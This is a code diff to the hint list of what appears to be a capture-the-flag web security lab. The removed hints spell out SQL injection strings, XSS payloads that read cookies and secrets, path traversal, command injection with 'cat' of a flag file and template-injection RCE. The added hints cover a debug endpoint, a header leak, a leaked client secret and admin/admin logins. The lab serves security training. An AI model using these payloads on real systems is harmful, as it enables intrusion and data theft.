@@ -59,84 +59,39 @@ export const HINTS = [
   },
   {
     id: 7,
-    title: 'Union Based SQLi',
-    category: 'SQLi',
-    points: 125,
-    hint: `In the search box paste:  ' UNION SELECT id, flag, flag FROM secret_flags -- `,
-    target: 'Go to search lab',
-    href: '/lab#search'
+    title: 'Debug Endpoint',
+    category: 'MISCONFIG',
+    points: 50,
+    hint: 'Open /api/debug. The JSON response includes a flag field — no payload needed.',
+    target: 'Open /api/debug',
+    href: `${API}/api/debug`
   },
   {
     id: 8,
-    title: 'Boolean Blind SQLi',
-    category: 'SQLi',
-    points: 150,
-    hint: `Use /api/item?id=1 and append: AND substr((SELECT flag FROM secret_flags WHERE id=8),N,1)='X'. found:true means the character matched.`,
-    target: 'Go to blind lab',
-    href: '/lab#item'
+    title: 'Header Leak',
+    category: 'DISCLOSURE',
+    points: 50,
+    hint: 'Open DevTools → Network → click /api/health and read the X-CTF-Flag response header.',
+    target: 'Check response headers',
+    href: `${API}/api/health`
   },
   {
     id: 9,
-    title: 'Stored XSS',
-    category: 'XSS',
-    points: 100,
-    hint: 'Post this as a comment: <img src=x onerror="alert(window.__SECRET__)">  — comments render as raw HTML.',
-    target: 'Go to comments lab',
-    href: '/lab#comments'
+    title: 'Client Secret',
+    category: 'CLIENT',
+    points: 50,
+    hint: 'Open /assets/config.js. A CLIENT_SECRET constant was shipped to the browser by mistake.',
+    target: 'Open config.js',
+    href: `${API}/assets/config.js`
   },
   {
     id: 10,
-    title: 'Reflected XSS',
-    category: 'XSS',
-    points: 100,
-    hint: `Open /greet?name=<img src=x onerror="alert(document.cookie)">  — the xss_flag cookie is the flag.`,
-    target: 'Open reflected XSS endpoint',
-    href: `${API}/greet?name=guest`
-  },
-  {
-    id: 11,
-    title: 'Local File Inclusion',
-    category: 'FILE',
-    points: 125,
-    hint: 'Open /page?page=about, then use: ../../data/secrets/lfi_flag.txt',
-    target: 'Go to file lab',
-    href: '/lab#page'
-  },
-  {
-    id: 12,
-    title: 'Download Traversal',
-    category: 'FILE',
-    points: 100,
-    hint: 'Open /download?file=manifesto.txt, then use: ../secrets/download_flag.txt',
-    target: 'Go to file lab',
-    href: '/lab#download'
-  },
-  {
-    id: 13,
-    title: 'Command Injection',
-    category: 'RCE',
-    points: 150,
-    hint: 'Open /api/ping?host=127.0.0.1; cat data/secrets/cmd_flag.txt',
-    target: 'Go to ping lab',
-    href: '/lab#ping'
-  },
-  {
-    id: 14,
-    title: 'Upload + Template RCE',
-    category: 'RCE',
-    points: 175,
-    hint: 'Upload shell.ejs containing <%= process.env.CTF_FLAG_14 %>, then open /render?view=shell.ejs',
-    target: 'Go to upload lab',
-    href: '/lab#upload'
-  },
-  {
-    id: 15,
-    title: 'The Final Chain',
-    category: 'CHAIN',
-    points: 200,
-    hint: `Read /backup/db.js.bak, then search:  ' UNION SELECT id, note, note FROM vault -- `,
-    target: 'Open backup file',
-    href: `${API}/backup/db.js.bak`
+    title: 'Legacy Login',
+    category: 'ACCESS CONTROL',
+    points: 75,
+    hint: 'Open /legacy-login and sign in with username admin and password admin.',
+    target: 'Open legacy portal',
+    href: `${API}/legacy-login`
   }
 ]
 
